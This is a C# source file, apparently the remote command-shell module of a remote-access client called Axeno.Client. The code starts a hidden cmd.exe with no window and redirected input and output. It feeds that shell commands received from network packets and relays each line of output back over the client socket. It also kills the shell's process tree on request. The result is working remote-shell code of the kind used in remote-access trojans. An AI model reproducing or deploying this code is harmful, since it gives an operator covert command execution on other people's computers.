using Axeno.Client.MessagePack;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Linq.Expressions;
using System.Management;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Axeno.Client.Networking.Functions.System
{
    internal class CommandPrompt
    {
        public static Process cmd;
        public static void HandlePacket(MsgPack msgpck)
        {
            try
            {
                string status = msgpck.ForcePathObject("Status").AsString;
                string command = msgpck.ForcePathObject("Command").AsString;
                if (status == "begin")
                {
                    BeginCMD();
                }
                else if (status == "end")
                {
                    EndCMD();
                }
                if (command != null || command != "")
                {
                    
                    WriteCMD(command);

                }
            }catch(Exception ex)
            {
                Debug.WriteLine(ex.ToString());
            }

        }
        public static void BeginCMD()
        {
            cmd = new Process()
            {
                StartInfo = new ProcessStartInfo("cmd")
                {
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    RedirectStandardOutput = true,
                    RedirectStandardInput = true,
                    RedirectStandardError = true,
                    WorkingDirectory = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System))
                }
            };
            cmd.OutputDataReceived += ShellDataHandler;
            cmd.ErrorDataReceived += ShellDataHandler;
            cmd.Start();
            cmd.BeginOutputReadLine();
            cmd.BeginErrorReadLine();

        }
        public static void EndCMD()
        {
            ShellClose();

        }
        public static void WriteCMD(string command)
        {
            
            if(command.ToLower() == "exit")
            {
                ShellClose();
            }else
            {
                Debug.WriteLine($"{command}");
                cmd.StandardInput.WriteLine(command);

            }
        }
        private static void ShellDataHandler(object sender, DataReceivedEventArgs e)
        {
            StringBuilder Output = new StringBuilder();
            try
            {
                Output.AppendLine(e.Data);
                Debug.WriteLine(e.Data);


                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "cmd";
                msgpack.ForcePathObject("Response").AsString = Output.ToString();
                ClientSocket.QueueCommand(msgpack.Encode2Bytes());
            }
            catch { }
        }
        public static void ShellClose()
        {
            try
            {
                if (cmd != null)
                {
                    KillProcessAndChildren(cmd.Id);
                    cmd.OutputDataReceived -= ShellDataHandler;
                    cmd.ErrorDataReceived -= ShellDataHandler;
                }
            }
            catch { }
        }

        private static void KillProcessAndChildren(int pid)
        {
            if (pid == 0)
            {
                return;
            }
            ManagementObjectSearcher searcher = new ManagementObjectSearcher
                    ("Select * From Win32_Process Where ParentProcessID=" + pid);
            ManagementObjectCollection moc = searcher.Get();
            foreach (ManagementObject mo in moc)
            {
                KillProcessAndChildren(Convert.ToInt32(mo["ProcessID"]));
            }
            try
            {
                Process proc = Process.GetProcessById(pid);
                proc.Kill();
            }
            catch { }
        }
    }
}
